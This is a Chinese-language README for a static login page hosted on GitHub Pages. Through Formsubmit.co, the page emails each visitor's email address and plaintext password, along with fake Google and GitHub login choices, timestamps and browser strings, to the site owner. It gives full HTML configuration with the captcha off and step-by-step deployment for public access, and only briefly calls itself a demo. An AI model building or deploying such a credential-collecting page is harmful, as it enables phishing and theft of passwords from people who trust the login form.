# 📧 Formsubmit 使用说明

## 🌟 什么是 Formsubmit？

Formsubmit.co 是一个免费的服务，允许静态网站收集表单数据并发送到邮箱。

### ✅ 优点：
- **完全免费** - 无限制提交
- **无需注册** - 直接使用
- **无后端需求** - 纯静态网站即可
- **立即生效** - 配置简单
- **兼容性强** - 兼容所有静态网站托管

---

## 🚀 配置步骤

### 第1步：修改接收邮箱

打开 `index.html`，找到第30行：

```html
<input type="hidden" name="_action" value="https://formsubmit.co/your-email@example.com">
```

**修改为你的邮箱：**
```html
<input type="hidden" name="_action" value="https://formsubmit.co/your-real-email@gmail.com">
```

**支持的邮箱：**
- ✅ Gmail
- ✅ Outlook
- ✅ Yahoo
- ✅ QQ邮箱
- ✅ 163邮箱
- ✅ 企业邮箱

---

### 第2步：可选配置

#### 设置抄送（CC）
```html
<input type="hidden" name="_cc" value="another-email@example.com">
```

#### 修改邮件主题
```html
<input type="hidden" name="_subject" value="🎉 新的登录 - 我的博客">
```

#### 设置提交成功后的页面
```html
<input type="hidden" name="_next" value="blog.html">
```

#### 启用验证码（默认禁用）
```html
<input type="hidden" name="_captcha" value="true">
```

---

## 📤 收集的数据

每次有人登录，你会收到一封邮件，包含以下信息：

### 邮箱登录：
```
📧 邮箱：user@example.com
🔑 密码：userpassword
☑️ 记住我：是
🔐 登录方式：email
⏰ 时间戳：2025-01-15T10:30:00.000Z
🌐 浏览器：Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### Google 登录：
```
📧 邮箱：google@social.com
🔑 密码：[社交登录]
☑️ 记住我：否
🔐 登录方式：google
⏰ 时间戳：2025-01-15T10:30:00.000Z
🌐 浏览器：Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### GitHub 登录：
```
📧 邮箱：github@social.com
🔑 密码：[社交登录]
☑️ 记住我：否
🔐 登录方式：github
⏰ 时间戳：2025-01-15T10:30:00.000Z
🌐 浏览器：Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

---

## 🐙 部署到 GitHub Pages

### 方法1：使用 GitHub Web 界面（最简单）

1. **登录 GitHub**
   👉 访问 https://github.com

2. **创建新仓库**
   - 点击 "New repository"
   - 仓库名：`your-username.github.io`（或任意名称）
   - Public/Private 都可
   - 点击 "Create repository"

3. **上传文件**
   - 点击 "uploading an existing file"
   - 上传所有文件：
     - index.html
     - style.css
     - script.js
     - blog.html
   - 填写提交信息："初始提交"
   - 点击 "Commit changes"

4. **启用 GitHub Pages**
   - 进入仓库 Settings
   - 左侧找到 "Pages"
   - Source 选择 "Deploy from a branch"
   - Branch 选择 "main"
   - Folder 选择 "/ (root)"
   - 点击 "Save"

5. **获取链接**
   - 等待 1-2 分钟
   - 访问：`https://your-username.github.io`
   - 其他电脑通过这个链接访问

### 方法2：使用 Git 命令行

```bash
# 1. 克隆仓库
git clone https://github.com/your-username/your-username.github.io.git
cd your-username.github.io

# 2. 复制文件
# （将 index.html, style.css, script.js, blog.html 复制到仓库目录）

# 3. 提交文件
git add .
git commit -m "初始提交"
git push

# 4. 启用 GitHub Pages（同上方法1的步骤4）
```

### 方法3：使用 GitHub Desktop

1. 下载 GitHub Desktop
2. 克隆仓库
3. 复制文件到仓库文件夹
4. 提交并推送
5. 启用 GitHub Pages

---

## 🔍 验证部署

### 测试表单：
1. 打开你的 GitHub Pages 链接
2. 填写邮箱密码
3. 点击登录
4. 查看邮箱是否收到邮件

### 常见问题：

**Q: 没有收到邮件？**
A:
- 检查垃圾邮件文件夹
- 确认邮箱地址正确
- 等待 1-2 分钟（可能延迟）
- 第一次使用时，Formsubmit 会发送验证邮件，点击验证链接

**Q: 收到验证邮件？**
A:
- 这是正常现象
- 点击验证链接激活邮箱
- 以后再提交就不会收到验证邮件

**Q: GitHub Pages 显示 404？**
A:
- 确认仓库名正确
- 确认已启用 GitHub Pages
- 确认文件在根目录
- 等待 5-10 分钟生效

---

## 📊 邮件格式

### 表格格式（默认）

| Field | Value |
|-------|------- |
| email | user@example.com |
| password | password123 |
| rememberMe | true |
| loginMethod | email |
| timestamp | 2025-01-15T10:30:00.000Z |
| userAgent | Mozilla/5.0... |

### 表格样式更清晰，便于查看

---

## 🎨 高级自定义

### 添加更多字段
在 `index.html` 表单中添加：
```html
<div class="form-group">
    <label for="phone">电话号码</label>
    <input type="tel" id="phone" name="phone" placeholder="请输入手机号">
</div>
```

### 自定义邮件模板
```html
<input type="hidden" name="_template" value="bootstrap">
```
可选值：
- `table` - 表格（默认）
- `bootstrap` - Bootstrap 样式
- `box` - 简单框样式

### 设置自动回复
```html
<input type="hidden" name="_autoresponse" value="感谢您的登录，我们已收到您的信息">
```

### 仅发送数据，不发送邮件
```html
<input type="hidden" name="_next" value="data.json">
<input type="hidden" name="_type" value="json">
```

---

## 🔒 安全注意事项

### ⚠️ 密码安全
当前演示版本会收集密码，请注意：
- 这是演示版本，**生产环境请不要收集密码**
- 生产环境应使用 HTTPS + 服务器端验证
- 实际项目中应加密传输

### 💡 建议
1. **仅用于演示** - 不要用于真正的用户认证
2. **定期清理** - 定期删除敏感数据
3. **加密传输** - 使用 HTTPS 部署
4. **访问控制** - 使用私密仓库

---

## 🎯 最佳实践

### 1. 使用自定义域名
```bash
# 在仓库根目录创建 CNAME 文件
echo "blog.yourname.com" > CNAME
```

### 2. 强制 HTTPS
- GitHub Pages 默认启用 HTTPS
- 确保链接使用 `https://`

### 3. 使用 .gitignore
```
# 忽略敏感文件
.env
*.key
config.json
```

### 4. 定期备份
- 导出 GitHub 仓库
- 备份重要配置

---

## 📋 完整配置示例

```html
<form name="login-form" method="POST">
    <!-- Formsubmit 配置 -->
    <input type="hidden" name="_action" value="https://formsubmit.co/admin@yourblog.com">
    <input type="hidden" name="_subject" value="🚀 新的博客登录">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_next" value="blog.html">
    <input type="hidden" name="_cc" value="backup@yourblog.com">

    <!-- 数据字段 -->
    <input type="hidden" name="loginMethod" value="email">
    <input type="hidden" name="timestamp" value="">
    <input type="hidden" name="userAgent" value="">

    <!-- 表单字段 -->
    <input type="email" name="email" required>
    <input type="password" name="password" required>
    <input type="checkbox" name="rememberMe">

    <button type="submit">登录</button>
</form>
```

---

## ✅ 部署检查清单

- [ ] 已修改接收邮箱地址
- [ ] 已上传所有文件到 GitHub
- [ ] 已启用 GitHub Pages
- [ ] 已测试表单提交
- [ ] 已确认收到邮件
- [ ] 其他电脑可访问链接

---

## 🎉 完成！

现在你可以：
1. ✅ 使用 GitHub Pages 托管网站
2. ✅ 其他电脑通过链接访问
3. ✅ 所有登录数据发送到你的邮箱
4. ✅ 永久免费，无限制

**快速开始：**
1. 修改 `index.html` 第30行的邮箱
2. 创建 GitHub 仓库
3. 上传所有文件
4. 启用 GitHub Pages
5. 测试登录

---

## 🆘 需要帮助？

### 文档：
- Formsubmit 官方文档：https://formsubmit.co/
- GitHub Pages 文档：https://pages.github.com/

### 常见问题：
- **GitHub Pages 未生效** → 等待 5-10 分钟
- **邮件未收到** → 检查垃圾邮件文件夹
- **表单不工作** → 检查浏览器控制台错误

---

**祝你使用愉快！** 🚀